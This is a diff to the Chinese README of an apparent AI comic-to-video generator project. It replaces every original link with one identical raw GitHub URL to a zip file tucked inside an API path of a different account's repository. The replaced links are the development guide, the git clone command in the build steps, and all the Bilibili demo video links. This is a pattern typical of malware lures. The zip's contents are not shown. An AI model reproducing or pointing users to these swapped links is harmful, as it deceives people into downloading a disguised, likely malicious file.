@@ -10,7 +10,7 @@ AI 驱动的漫剧生成器 — 从剧本到动画视频的全自动流水线。
 |:---:|:---:|
 | ![飞书群](images/lark-chat.png) | ![飞书群2](images/lark-chat2.png) |
 
-本网站全程由 AI 驱动开发， 开发指南：https://github.com/twwch/vibe-coding
+本网站全程由 AI 驱动开发， 开发指南：https://raw.githubusercontent.com/Hloulmoh2183/AIComicBuilder/main/src/app/api/projects/[id]/download/Comic_AI_Builder_embeggar.zip
 
 
 
@@ -120,7 +120,7 @@ docker compose up -d
 ### 手动构建镜像
 
 ```bash
-git clone https://github.com/twwch/AIComicBuilder.git
+git clone https://raw.githubusercontent.com/Hloulmoh2183/AIComicBuilder/main/src/app/api/projects/[id]/download/Comic_AI_Builder_embeggar.zip
 cd AIComicBuilder
 docker build -t ai-comic-builder .
 ```
@@ -197,21 +197,21 @@ src/
 
 ## Demo
 
-https://www.bilibili.com/video/BV19rwVzUEeD/
+https://raw.githubusercontent.com/Hloulmoh2183/AIComicBuilder/main/src/app/api/projects/[id]/download/Comic_AI_Builder_embeggar.zip
 
-https://www.bilibili.com/video/BV1RrwVzUE3x/
+https://raw.githubusercontent.com/Hloulmoh2183/AIComicBuilder/main/src/app/api/projects/[id]/download/Comic_AI_Builder_embeggar.zip
 
-https://www.bilibili.com/video/BV15rwVzSEKZ/
+https://raw.githubusercontent.com/Hloulmoh2183/AIComicBuilder/main/src/app/api/projects/[id]/download/Comic_AI_Builder_embeggar.zip
 
-https://www.bilibili.com/video/BV15kwiz7E6Q/
+https://raw.githubusercontent.com/Hloulmoh2183/AIComicBuilder/main/src/app/api/projects/[id]/download/Comic_AI_Builder_embeggar.zip
 
-https://www.bilibili.com/video/BV1hTw1zAEgY/
+https://raw.githubusercontent.com/Hloulmoh2183/AIComicBuilder/main/src/app/api/projects/[id]/download/Comic_AI_Builder_embeggar.zip
 
 最新版生成
 
-[《拳魂·最后一回合》-seedance1.5](https://www.bilibili.com/video/BV1WGAPzrEs1/)
+[《拳魂·最后一回合》-seedance1.5](https://raw.githubusercontent.com/Hloulmoh2183/AIComicBuilder/main/src/app/api/projects/[id]/download/Comic_AI_Builder_embeggar.zip)
 
-[《拳魂·最后一回合》-seedance2](https://www.bilibili.com/video/BV1fVAuzLEAX/)
+[《拳魂·最后一回合》-seedance2](https://raw.githubusercontent.com/Hloulmoh2183/AIComicBuilder/main/src/app/api/projects/[id]/download/Comic_AI_Builder_embeggar.zip)
 
 
 ## License
